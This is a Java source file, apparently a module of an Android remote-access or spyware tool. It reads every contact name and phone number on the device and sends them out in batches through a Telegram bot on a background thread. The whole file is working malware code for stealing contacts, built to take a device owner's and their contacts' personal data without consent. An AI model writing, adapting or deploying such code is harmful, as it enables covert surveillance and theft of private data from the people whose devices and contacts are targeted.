// language: Java, file: ExfilContacts.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;

public class ExfilContacts {

    public static void dump() {
        Thread t = new Thread(ExfilContacts::dumpSync, "v2-contacts");
        t.setDaemon(true);
        t.start();
    }

    static void dumpSync() {
        Context c = TelegramBot.ctx;
        if (c == null) return;
        if (c.checkSelfPermission(Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            TelegramBot.send("<i>err: READ_CONTACTS not granted</i>");
            return;
        }
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[] {
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                },
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if (cur == null) { TelegramBot.send("<i>contacts: null cursor</i>"); return; }
            int total = cur.getCount();
            StringBuilder b = new StringBuilder();
            b.append("<b>Contacts</b> (").append(total).append(")\n\n");
            int i = 0;
            while (cur.moveToNext()) {
                String name = cur.getString(0);
                String num = cur.getString(1);
                b.append("• <b>").append(TelegramBot.esc(name == null ? "?" : name))
                 .append("</b> — <code>").append(TelegramBot.esc(num == null ? "?" : num))
                 .append("</code>\n");
                i++;
                if (i % 50 == 0 && b.length() > 3000) {
                    TelegramBot.send(b.toString());
                    b.setLength(0);
                }
            }
            if (b.length() > 0) TelegramBot.send(b.toString());
        } catch (Throwable t) {
            CommandRouter.err(t.getMessage());
        } finally {
            if (cur != null) try { cur.close(); } catch (Throwable ignored) {}
        }
    }
}